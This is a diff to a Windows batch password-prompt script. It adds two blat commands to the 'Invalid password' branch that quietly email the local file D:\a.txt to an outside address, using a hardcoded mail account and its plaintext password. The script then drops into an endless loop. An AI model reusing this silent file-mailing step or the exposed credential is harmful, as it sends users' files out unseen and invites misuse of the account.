@@ -35,6 +35,8 @@ goto End
 :FAIL  
 echo Invalid password 
 echo 
+blat -install smtp.163.com  liubaozhu1258@163.com
+blat D:\a.txt -to  3015216069@tju.edu.cn  -u  liubaozhu1258@163.com  -pw asdf1258  -subject  warning
 color 0a
 setlocal ENABLEDELAYEDEXPANSION
 for /l %%i in (0) do (
